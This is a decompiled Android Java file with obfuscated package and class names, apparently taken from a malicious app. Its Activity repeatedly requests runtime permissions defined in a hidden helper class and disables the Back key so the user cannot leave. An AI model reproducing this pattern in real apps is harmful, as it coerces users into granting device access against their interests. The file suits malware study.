package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import wocwvy.czyxoxmbauu.slsa.C0019a;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class sxfl extends Activity {

    /* JADX INFO: renamed from: a */
    C0019a f473a = new C0019a();

    /* JADX INFO: renamed from: b */
    C0020b f474b = new C0020b();

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (this.f474b.m252e(this)) {
            finish();
        }
        if (Build.VERSION.SDK_INT >= 23) {
            if (checkCallingOrSelfPermission(this.f473a.f339d[0]) != 0) {
                requestPermissions(this.f473a.f339d, 111);
            }
            if (checkCallingOrSelfPermission(this.f473a.f340e[0]) != 0) {
                requestPermissions(this.f473a.f340e, 111);
            }
            if (checkCallingOrSelfPermission(this.f473a.f341f[0]) != 0) {
                requestPermissions(this.f473a.f341f, 111);
            }
            if (checkCallingOrSelfPermission(this.f473a.f342g[0]) != 0) {
                requestPermissions(this.f473a.f342g, 111);
            }
            if (checkCallingOrSelfPermission(this.f473a.f338c[0]) != 0) {
                requestPermissions(this.f473a.f338c, 111);
            }
            if (checkCallingOrSelfPermission(this.f473a.f337b[0]) != 0) {
                requestPermissions(this.f473a.f337b, 111);
            }
        }
        finish();
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 4 || super.onKeyDown(i, keyEvent);
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
    }
}
